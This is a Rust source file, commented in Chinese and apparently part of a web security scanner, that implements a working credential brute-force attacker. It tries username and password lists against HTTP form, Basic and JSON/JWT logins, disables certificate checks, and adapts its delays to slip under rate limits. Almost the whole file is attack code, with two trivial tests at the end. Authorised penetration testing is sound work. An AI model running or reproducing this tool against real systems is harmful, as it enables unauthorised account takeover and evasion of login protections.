// Enhanced Authentication Brute Force Module
// OWASP A07:2021 - Identification and Authentication Failures
//
// 智能速率控制 + 多協議支持

use reqwest::{Client, StatusCode};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::time::sleep;

/// 認證協議類型
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AuthProtocol {
    HTTP,
    HTTPBasic,
    HTTPDigest,
    FormBased,
    JWT,
    OAuth2,
}

/// 速率限制策略
#[derive(Debug, Clone)]
pub enum RateLimitStrategy {
    /// 固定延遲
    Fixed(Duration),
    /// 指數退避
    ExponentialBackoff { initial: Duration, max: Duration, multiplier: f64 },
    /// 自適應（根據響應時間調整）
    Adaptive,
}

/// 爆破結果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BruteForceResult {
    pub success: bool,
    pub username: String,
    pub password: String,
    pub attempts: u32,
    pub total_time_ms: u64,
    pub evidence: String,
}

/// 增強的認證爆破器
pub struct AuthBruteForcer {
    client: Client,
    protocol: AuthProtocol,
    rate_limit_strategy: RateLimitStrategy,
    max_attempts: u32,
    
    // 統計信息
    total_attempts: u32,
    successful_logins: Vec<BruteForceResult>,
    
    // 自適應速率控制
    response_times: Vec<Duration>,
    current_delay: Duration,
}

impl AuthBruteForcer {
    pub fn new(protocol: AuthProtocol, rate_limit_strategy: RateLimitStrategy, max_attempts: u32) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client,
            protocol,
            rate_limit_strategy,
            max_attempts,
            total_attempts: 0,
            successful_logins: Vec::new(),
            response_times: Vec::new(),
            current_delay: Duration::from_millis(100),
        }
    }

    /// 執行爆破攻擊
    pub async fn brute_force(
        &mut self,
        target_url: &str,
        usernames: &[String],
        passwords: &[String],
    ) -> Vec<BruteForceResult> {
        let start_time = Instant::now();

        for username in usernames {
            if self.total_attempts >= self.max_attempts {
                break;
            }

            for password in passwords {
                if self.total_attempts >= self.max_attempts {
                    break;
                }

                // 應用速率限制
                self.apply_rate_limit().await;

                // 嘗試登入
                let attempt_start = Instant::now();
                let result = self.attempt_login(target_url, username, password).await;
                let attempt_duration = attempt_start.elapsed();

                self.response_times.push(attempt_duration);
                self.total_attempts += 1;

                if result {
                    let finding = BruteForceResult {
                        success: true,
                        username: username.clone(),
                        password: password.clone(),
                        attempts: self.total_attempts,
                        total_time_ms: start_time.elapsed().as_millis() as u64,
                        evidence: format!("Valid credentials found: {}:{}", username, password),
                    };
                    self.successful_logins.push(finding);
                }

                // 自適應速率調整
                self.adjust_adaptive_rate();
            }
        }

        self.successful_logins.clone()
    }

    /// 嘗試單次登入
    async fn attempt_login(&self, target_url: &str, username: &str, password: &str) -> bool {
        match self.protocol {
            AuthProtocol::HTTP | AuthProtocol::FormBased => {
                self.attempt_http_login(target_url, username, password).await
            }
            AuthProtocol::HTTPBasic => {
                self.attempt_basic_auth(target_url, username, password).await
            }
            AuthProtocol::JWT => {
                self.attempt_jwt_login(target_url, username, password).await
            }
            _ => false,
        }
    }

    /// HTTP 表單登入嘗試
    async fn attempt_http_login(&self, target_url: &str, username: &str, password: &str) -> bool {
        let mut form = HashMap::new();
        form.insert("username", username);
        form.insert("password", password);

        match self.client.post(target_url).form(&form).send().await {
            Ok(response) => {
                let status = response.status();
                
                // 成功登入的跡象
                if status == StatusCode::OK || status == StatusCode::FOUND {
                    // 檢查響應內容
                    if let Ok(text) = response.text().await {
                        return !text.contains("invalid") 
                            && !text.contains("incorrect")
                            && !text.contains("failed")
                            && (text.contains("welcome") 
                                || text.contains("dashboard")
                                || text.contains("logout"));
                    }
                }
                false
            }
            Err(_) => false,
        }
    }

    /// HTTP Basic 認證嘗試
    async fn attempt_basic_auth(&self, target_url: &str, username: &str, password: &str) -> bool {
        match self.client
            .get(target_url)
            .basic_auth(username, Some(password))
            .send()
            .await
        {
            Ok(response) => response.status() == StatusCode::OK,
            Err(_) => false,
        }
    }

    /// JWT 登入嘗試
    async fn attempt_jwt_login(&self, target_url: &str, username: &str, password: &str) -> bool {
        let mut json = HashMap::new();
        json.insert("username", username);
        json.insert("password", password);

        match self.client.post(target_url).json(&json).send().await {
            Ok(response) => {
                if response.status() == StatusCode::OK {
                    // 檢查是否返回 JWT token
                    if let Ok(text) = response.text().await {
                        return text.contains("token") || text.contains("jwt");
                    }
                }
                false
            }
            Err(_) => false,
        }
    }

    /// 應用速率限制
    async fn apply_rate_limit(&self) {
        match &self.rate_limit_strategy {
            RateLimitStrategy::Fixed(duration) => {
                sleep(*duration).await;
            }
            RateLimitStrategy::ExponentialBackoff { initial, max, multiplier } => {
                let delay = (*initial * self.total_attempts as u32).min(*max);
                let backoff_delay = Duration::from_millis(
                    (delay.as_millis() as f64 * multiplier) as u64
                );
                sleep(backoff_delay.min(*max)).await;
            }
            RateLimitStrategy::Adaptive => {
                sleep(self.current_delay).await;
            }
        }
    }

    /// 自適應速率調整（基於響應時間）
    fn adjust_adaptive_rate(&mut self) {
        if matches!(self.rate_limit_strategy, RateLimitStrategy::Adaptive) {
            if self.response_times.len() < 5 {
                return;
            }

            // 計算最近5次響應的平均時間
            let recent: Vec<_> = self.response_times.iter().rev().take(5).cloned().collect();
            let avg_response = recent.iter().sum::<Duration>() / recent.len() as u32;

            // 如果響應時間增加，增加延遲（可能遇到速率限制）
            if avg_response > Duration::from_secs(2) {
                self.current_delay = self.current_delay.mul_f64(1.5).min(Duration::from_secs(5));
            } else if avg_response < Duration::from_millis(500) {
                // 響應快，可以減少延遲
                self.current_delay = self.current_delay.mul_f64(0.8).max(Duration::from_millis(50));
            }
        }
    }

    /// 獲取統計信息
    pub fn get_statistics(&self) -> HashMap<String, String> {
        let mut stats = HashMap::new();
        stats.insert("total_attempts".to_string(), self.total_attempts.to_string());
        stats.insert("successful_logins".to_string(), self.successful_logins.len().to_string());
        
        if !self.response_times.is_empty() {
            let avg_time = self.response_times.iter().sum::<Duration>() / self.response_times.len() as u32;
            stats.insert("avg_response_time_ms".to_string(), avg_time.as_millis().to_string());
        }
        
        stats
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rate_limit_strategy() {
        let strategy = RateLimitStrategy::Fixed(Duration::from_millis(100));
        match strategy {
            RateLimitStrategy::Fixed(d) => assert_eq!(d.as_millis(), 100),
            _ => panic!("Wrong strategy type"),
        }
    }

    #[tokio::test]
    async fn test_bruteforcer_creation() {
        let bruteforcer = AuthBruteForcer::new(
            AuthProtocol::HTTP,
            RateLimitStrategy::Fixed(Duration::from_millis(100)),
            100,
        );
        assert_eq!(bruteforcer.total_attempts, 0);
    }
}
